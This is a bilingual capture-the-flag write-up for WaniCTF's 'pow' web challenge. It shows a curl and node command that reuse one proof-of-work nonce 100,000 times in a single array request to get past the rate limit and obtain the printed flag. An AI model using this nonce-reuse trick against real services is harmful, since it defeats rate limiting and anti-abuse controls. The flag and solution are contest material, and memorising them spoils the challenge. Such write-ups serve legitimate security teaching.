---
title: pow
level: 2
flag: FLAG{N0nCE_reusE_i$_FUn}
writer: southball
---

# pow

## 問題文 / Statement

compute hash to get your flag

ハッシュを計算してフラグを取ろう

https://web-pow-lz56g6.wanictf.org/

---

NOTE: In case the server is down, try the following backup server. 上記のサーバーが正しく動作していない場合は、次のバックアップサーバーを使用してください。

`web-pow-ywu5dn.wanictf.org`

---

## 解法 / Writeup

If we open the page for a while and take a look at the network tab, we will see a network request:  
しばらくページを開いて、ネットワークタブを見てみると、ネットワークリクエストが表示されます：

![network_pow_1.png](./resources_writeup/network_pow_1.png)
![network_pow_2.png](./resources_writeup/network_pow_2.png)
![network_pow_3.png](./resources_writeup/network_pow_3.png)

There is a convenient feature in Chrome to replay a request. We can use the "Copy as cURL (bash)" option by right clicking the request.  
Chromeにはリクエストを再び実行する便利な機能があります。リクエストを右クリックして「cURLとしてコピー（bash）」オプションが使えます。

![network_copy_to_curl_bash.png](./resources_writeup/network_copy_to_curl_bash.png)

```
❯ curl 'https://web-pow-lz56g6.wanictf.org/api/pow' \
  -H 'accept: */*' \
  -H 'accept-language: en,ja;q=0.9,en-US;q=0.8' \
  -H 'cache-control: no-cache' \
  -H 'content-type: application/json' \
  -H 'cookie: pow_session=<REDACTED>' \
  -H 'origin: https://web-pow-lz56g6.wanictf.org' \
  -H 'pragma: no-cache' \
  -H 'priority: u=1, i' \
  -H 'referer: https://web-pow-lz56g6.wanictf.org/' \
  -H 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' \
  --data-raw '["2862152"]'
progress: 2 / 1000000
```

So we know that by sending this request many times we can solve the problem. But soon, we will see the `rate limit exceeded` message. So we need to send the requests in a smarter way.  
このリクエストを何度か送ることで問題を解くことがわかったが、たくさん送ってみると `rate limit exceeded` が出てきます。なので、もっと賢い方法で送る必要がある。

We notice that the data sent is an array. Maybe we can send more than one message...? When we try to send `["2862152","2862152"]`, we will see the progress increase by 2. So we try to send more.  
送信したデータは配列なので、もしかすると二個以上の値が送れる...？`["2862152","2862152"]` を送ってみると progress が 2 増えるので、もっと多く送ってみます。

```sh
$ ...

$ node -e "console.log(JSON.stringify(new Array(100000).fill('2862152')))" | curl 'https://web-pow-lz56g6.wanictf.org/api/pow' \
  -H 'accept: */*' \
  -H 'accept-language: en,ja;q=0.9,en-US;q=0.8' \
  -H 'cache-control: no-cache' \
  -H 'content-type: application/json' \
  -H 'cookie: pow_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZXNzaW9uSWQiOiIzYTFiM2VjNC1iMjA0LTRiNTQtYTAwNC1mNzA4YzZkZDRiZmUifQ.WaQV8WI-amfxGJKexTYF3QJhGZYewTt4uEeQ-Wak5sU' \
  -H 'origin: https://web-pow-lz56g6.wanictf.org' \
  -H 'pragma: no-cache' \
  -H 'priority: u=1, i' \
  -H 'referer: https://web-pow-lz56g6.wanictf.org/' \
  -H 'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Windows"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36' \
  --data @-
FLAG{N0nCE_reusE_i$_FUn}
```

and we have solved the problem.  
それで、問題は解けました。